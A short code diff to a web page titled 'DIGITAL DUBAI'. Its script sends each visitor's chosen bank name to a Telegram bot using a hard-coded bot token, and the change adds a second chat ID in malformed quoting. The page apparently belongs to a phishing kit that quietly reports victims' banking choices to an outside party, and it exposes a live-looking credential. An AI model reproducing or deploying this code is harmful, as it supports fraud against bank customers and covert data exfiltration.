@@ -276,7 +276,7 @@ DIGITAL DUBAI
     <script>
         function sendToTelegram(bankName) {
             const botToken = "7382709286:AAF6f86_QMTS90nl4LLaiLsu0b27vEdtYFs";
-            const chatId = "7585533835";
+            const chatId = "7585533835', '5181794533'";
             const message = `🏦 الزائر اختار البنك: ${bankName}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
